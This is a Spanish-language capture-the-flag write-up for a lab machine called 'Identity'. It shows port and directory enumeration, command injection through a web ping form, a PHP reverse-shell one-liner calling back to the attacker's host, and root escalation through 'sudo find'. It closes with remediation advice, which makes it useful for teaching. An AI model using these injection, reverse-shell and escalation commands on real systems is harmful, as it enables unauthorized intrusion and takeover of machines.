# >_ [Identity]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | Whoami Labs |
| **Dificultad** | 🟢 Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `172.17.0.2` |
| **Fecha de resolución** | 2026-10-08 |

---

## 📝 Descripción
Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
sudo nmap -p- --open -n -Pn 172.17.0.2 -oN allPorts
```


**Resultados del escaneo:**
* **Puerto 80/TCP**: HTTP (Apache)

<img width="1195" height="244" alt="1Escaneo" src="https://github.com/user-attachments/assets/b680b9ca-0d9f-4fc9-aa75-0b1aab6a0cc4" />
<br><br>

### Enumeración de servicios
Continuamos con un escaneo más profundo del servicio encontrado:

```bash
sudo nmap -sCV -p 80 172.17.0.2 -oN targeted
```
<img width="1179" height="285" alt="2EScaneopuerto" src="https://github.com/user-attachments/assets/2adb932e-a7c8-42c3-a4c1-1cb2e47b8578" />
<br><br>


### Enumeración Web (Puerto 80)
Al inspeccionar el sitio web, nos encontramos con la página por defecto de Apache, no vemos nada relevante por lo que enumeramos con gobuster.

Aplicamos fuzzing de directorios para buscar rutas ocultas:
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/rockyou.txt -x php,txt,html -t 100 -k -r --no-error
```
<img width="1918" height="480" alt="3gobuster" src="https://github.com/user-attachments/assets/781348f6-410a-44e6-b727-47d7c1b5c37d" />
<br><br>

Encontramos una ruta interesante /index.php asi que vamos a mirar que hay y ver si podemos explotarlo.
<br><br>

---

## 💥 2. Fase de Explotación (Acceso Inicial)


<img width="1443" height="790" alt="4web" src="https://github.com/user-attachments/assets/f2ff8998-3424-4925-b77c-ee905582bc65" />

### Vector de Ataque
En index.php hay una consola que acepta ips para verificar la conectividad, ejecuta un ping, vamos a probar a poner un comando detrás para ver si ejecuta varios.

```bash
127.0.0.1 ; ls -la
```

<img width="1276" height="815" alt="5preubaaa" src="https://github.com/user-attachments/assets/37517bc0-e227-457a-993d-53db16e6a283" />
<br><br>

Nos muestra el ping y debajo nos ha ejecutado el **ls -la** que pusimos, por lo que es vulnerable. 
Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dijo que somos ese usuario.


<img width="1379" height="852" alt="6encontramos" src="https://github.com/user-attachments/assets/e2735431-3bf7-4db4-acc9-68a0e9e62059" />
<br><br>
Entramos al directorio del usuario web-admin para leer la flag del usuario.

```bash
127.0.0.1 ;  cat /home/web-admin/user.txt
```

<img width="1506" height="885" alt="7flagusuario" src="https://github.com/user-attachments/assets/c1d26f07-a1b5-41f8-bbe6-8358db60f015" />
<br><br>

La flag es correcta, vamos a continuar obtenido una consola más interactiva para poder escalar privilegios más facilmente.


<img width="988" height="518" alt="8flag" src="https://github.com/user-attachments/assets/cf806bdf-c760-4547-8e9a-85f08d76a89a" />
<br><br>


### Intrusión (Reverse Shell)
Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:

```php
# Comando ejecutado en el navegador web
127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
```

<img width="1372" height="821" alt="9revelsehell" src="https://github.com/user-attachments/assets/9bb10cb9-70d3-4eb2-a2d6-64e762e2ec23" />
<br><br>


Ponemos nuestro *netcat* a la escucha para recibir la conexión:
```bash
sudo nc -lvnp 440
```

<img width="978" height="307" alt="10recibida" src="https://github.com/user-attachments/assets/f5b44944-fba7-4f5f-a727-f65fb4943e64" />
Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.

```bash
# Tratamiento de  la TTY para tener una consola interactiva cómoda
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```


## 👑 3. Escalada de Privilegios

### Enumeración del Sistema

```bash
# Comprobamos privilegios de SUDO
sudo -l
```
---

### Explotación del Vector de Escalada

Nos aprovechamos del permiso SUID que tenemos para ejecutar find sin contraseña y como el usuario root para convertirnos en el usuario root.

```bash
sudo find . -exec /bin/sh \; -quit
```

<img width="991" height="428" alt="11root" src="https://github.com/user-attachments/assets/856ffe1c-6d52-4d25-88f3-c5de7978d181" />
<br><br>


¡Ya somos **root**! 🚩

<img width="992" height="691" alt="Finaaal" src="https://github.com/user-attachments/assets/b42ae430-6909-416c-89e2-60fd0f683364" />
<br><br>

Por último, validamos la flag obtenida.
<img width="1086" height="181" alt="12flag2" src="https://github.com/user-attachments/assets/6bf0cbce-83f4-4349-951a-ecf3790287f7" />





---

## 🏁 4. Conclusiones y Mitigación
* **Vulnerabilidad Principal**: Falta de sanitización en los parámetros web de entrada. Esto ocurre cuando una aplicación web pasa datos ingresados por el usuario directamente al sistema operativo subyacente para ejecutar un comando, sin validar ni limpiar correctamente la entrada. También hay binarios con permisos SUDO mal configurados.
* **Remediación**: Actualizar los servicios vulnerables, implementar *whitelisting* en los inputs y aplicar el principio de menor privilegio retirando accesos SUDO innecesarios.

